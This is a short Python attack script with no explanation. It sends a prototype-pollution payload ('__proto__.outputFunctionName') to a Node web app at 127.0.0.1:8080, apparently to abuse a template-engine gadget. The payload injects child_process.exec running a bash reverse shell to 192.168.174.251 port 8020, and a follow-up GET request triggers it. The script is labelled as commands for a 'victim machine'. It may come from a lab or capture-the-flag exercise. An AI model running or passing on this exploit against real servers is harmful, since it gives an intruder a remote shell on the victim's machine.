#!/usr/bin/env python3

import requests

### commands to run on victim machine
cmd = 'bash -c "bash -i &> /dev/tcp/192.168.174.251/8020 0>&1"'

print("Starting Attack...")
### pollute
requests.post('http://127.0.0.1:8080', files = {'__proto__.outputFunctionName': (
    None, f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x")})

### execute command
requests.get('http://127.0.0.1:8080')
print("Finished!")
